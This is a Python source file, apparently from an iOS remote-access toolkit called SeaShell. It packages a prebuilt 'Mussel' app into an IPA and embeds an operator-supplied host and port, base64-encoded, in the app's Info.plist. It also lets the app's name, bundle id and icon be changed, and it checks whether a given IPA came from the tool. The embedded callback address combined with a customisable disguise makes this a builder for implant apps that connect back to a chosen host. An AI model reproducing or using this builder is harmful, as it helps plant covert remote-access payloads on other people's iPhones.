"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import shutil
import plistlib

from PIL import Image
from alive_progress import alive_bar
from pex.string import String
from typing import Optional

from seashell.lib.config import Config


class IPA(object):
    """ Subclass of seashell.core module.

    This subclass of seashell.core module is intended for providing
    an implementation of iOS Application Archive generator.
    """

    def __init__(self, host: Optional[str] = None, port: Optional[int] = None) -> None:
        """ Initialize device generator.

        :param Optional[str] host: host
        :param Optional[int] port: port
        :return None: None
        """

        super().__init__()

        self.config = Config()

        self.host = host
        self.port = port

        if host and port:
            self.hash = String().base64_string(
                f'{host}:{str(port)}', decode=True)
        else:
            self.hash = ''

        self.app_name = 'Mussel'
        self.bundle_id = 'com.entysec.mussel'
        self.binary_name = 'main'
        self.icon = self.config.data_path + 'AppIcon.png'

    def set_name(self, name: str, bundle_id: str) -> None:
        """ Set application name.

        :param str name: name of application
        :param str bundle_id: bundle id (e.g. com.entysec.dummy)
        :return None: None
        """

        if name:
            self.app_name = name.lower().title()

        if bundle_id:
            self.bundle_id = bundle_id

    def set_icon(self, icon: str) -> None:
        """ Set application icon.

        :param str icon: icon path
        :return None: None
        """

        self.icon = icon

    def generate(self, path: str) -> str:
        """ Generate IPA.

        :param str path: path to save ipa
        :return str: path to new IPA
        """

        with alive_bar(monitor=False, stats=False, ctrl_c=False, receipt=False,
                       title="Building {}".format(path)) as _:
            self.craft_icons()
            self.craft_plist()

            return self.build_ipa(path)

    def craft_icons(self) -> None:
        """ Craft icons.

        :return None: None
        """

        image = Image.open(self.icon)
        app = self.config.data_path + 'Mussel.app/'

        image.resize((29, 29), Image.LANCZOS).save(
            app + 'AppIcon29x29.png', 'PNG', quality=100)
        image.resize((29 * 2, 29 * 2), Image.LANCZOS).save(
            app + 'AppIcon29x29@2x.png', 'PNG', quality=100)
        image.resize((29 * 3, 29 * 3), Image.LANCZOS).save(
            app + 'AppIcon29x29@3x.png', 'PNG', quality=100)

        image.resize((40, 40), Image.LANCZOS).save(
            app + 'AppIcon40x40.png', 'PNG', quality=100)
        image.resize((40 * 2, 40 * 2), Image.LANCZOS).save(
            app + 'AppIcon40x40@2x.png', 'PNG', quality=100)
        image.resize((40 * 3, 40 * 3), Image.LANCZOS).save(
            app + 'AppIcon40x40@3x.png', 'PNG', quality=100)

        image.resize((50, 50), Image.LANCZOS).save(
            app + 'AppIcon50x50.png', 'PNG', quality=100)
        image.resize((50 * 2, 50 * 2), Image.LANCZOS).save(
            app + 'AppIcon50x50@2x.png', 'PNG', quality=100)

        image.resize((57, 57), Image.LANCZOS).save(
            app + 'AppIcon57x57.png', 'PNG', quality=100)
        image.resize((57 * 2, 57 * 2), Image.LANCZOS).save(
            app + 'AppIcon57x57@2x.png', 'PNG', quality=100)
        image.resize((57 * 3, 57 * 3), Image.LANCZOS).save(
            app + 'AppIcon57x57@3x.png', 'PNG', quality=100)

        image.resize((60, 60), Image.LANCZOS).save(
            app + 'AppIcon60x60.png', 'PNG', quality=100)
        image.resize((60 * 2, 60 * 2), Image.LANCZOS).save(
            app + 'AppIcon60x60@2x.png', 'PNG', quality=100)
        image.resize((60 * 3, 60 * 3), Image.LANCZOS).save(
            app + 'AppIcon60x60@3x.png', 'PNG', quality=100)

        image.resize((72, 72), Image.LANCZOS).save(
            app + 'AppIcon72x72.png', 'PNG', quality=100)
        image.resize((72 * 2, 72 * 2), Image.LANCZOS).save(
            app + 'AppIcon72x72@2x.png', 'PNG', quality=100)

        image.resize((76, 76), Image.LANCZOS).save(
            app + 'AppIcon76x76.png', 'PNG', quality=100)
        image.resize((76 * 2, 76 * 2), Image.LANCZOS).save(
            app + 'AppIcon76x76@2x.png', 'PNG', quality=100)

    def build_ipa(self, path: str) -> str:
        """ Build IPA.

        :param str path: path to save ipa
        :return str: path to new IPA
        """

        path = os.path.abspath(path)

        if not os.path.isdir(path):
            path = os.path.split(path)[0]

        app = path + '/' + self.app_name + '/'
        payload = app + 'Payload/'
        archive = path + '/' + self.app_name + '.ipa'

        os.mkdir(app)
        os.mkdir(payload)

        shutil.copytree(self.config.data_path + 'Mussel.app', payload + self.app_name + '.app')
        shutil.make_archive(archive, 'zip', app)
        shutil.move(archive + '.zip', archive)
        shutil.rmtree(app)

        return archive

    def check_ipa(self, path: str) -> bool:
        """ Check if IPA is generated by SeaShell.

        :param str path: path to IPA to check
        :return bool: True if generated else False
        """

        with alive_bar(monitor=False, stats=False, ctrl_c=False, receipt=False,
                       title="Checking {}".format(path)) as _:
            shutil.unpack_archive(path, format='zip')
            app_files = [file for file in os.listdir('Payload') if file.endswith('.app')]

            if not app_files:
                return

            bundle = '/'.join(('Payload', app_files[0] + '/'))
            hash = self.get_hash(bundle + 'Info.plist')

            if os.path.exists(bundle + 'mussel') and hash:
                return True

        return False

    @staticmethod
    def get_hash(path: str) -> str:
        """ Get hash from plist file.

        :param str path: path to plist file
        :return str: hash
        """

        with open(path, 'rb') as f:
            plist_data = plistlib.load(f)

        if 'CFBundleSignature' in plist_data:
            return plist_data['CFBundleSignature']

        return ''

    def craft_plist(self) -> None:
        """ Craft plist file.

        :return None: None
        """

        plist_path = (
                self.config.data_path +
                'Mussel.app/Info.plist'
        )

        plist = {
            'CFBundleDevelopmentRegion': 'en',
            'CFBundleDisplayName': self.app_name,
            'CFBundleExecutable': self.binary_name,
            'CFBundleIdentifier': self.bundle_id,
            'CFBundleInfoDictionaryVersion': '6.0',
            'CFBundleName': self.app_name,
            'CFBundlePackageType': 'APPL',
            'CFBundleShortVersionString': '1.0.0',
            'CFBundleSignature': self.hash,
            'CFBundleVersion': '1',
            'LSRequiresIPhoneOS': True,
            'UISupportedInterfaceOrientations': [
                'UIInterfaceOrientationPortrait',
                'UIInterfaceOrientationPortraitUpsideDown',
                'UIInterfaceOrientationLandscapeLeft',
                'UIInterfaceOrientationLandscapeRight'
            ]
        }

        if self.icon:
            plist.update({
                'CFBundleIcons': {
                    'CFBundlePrimaryIcon': {
                        'CFBundleIconFiles': [
                            'AppIcon29x29',
                            'AppIcon40x40',
                            'AppIcon57x57',
                            'AppIcon60x60',
                        ],
                        'UIPrerenderedIcon': True
                    }
                },
                'CFBundleIcons~ipad': {
                    'CFBundlePrimaryIcon': {
                        'CFBundleIconFiles': [
                            'AppIcon29x29',
                            'AppIcon40x40',
                            'AppIcon57x57',
                            'AppIcon60x60',
                            'AppIcon50x50',
                            'AppIcon72x72',
                            'AppIcon76x76',
                        ],
                        'UIPrerenderedIcon': True
                    }
                }
            })

        with open(plist_path, 'wb') as f:
            plistlib.dump(plist, f)
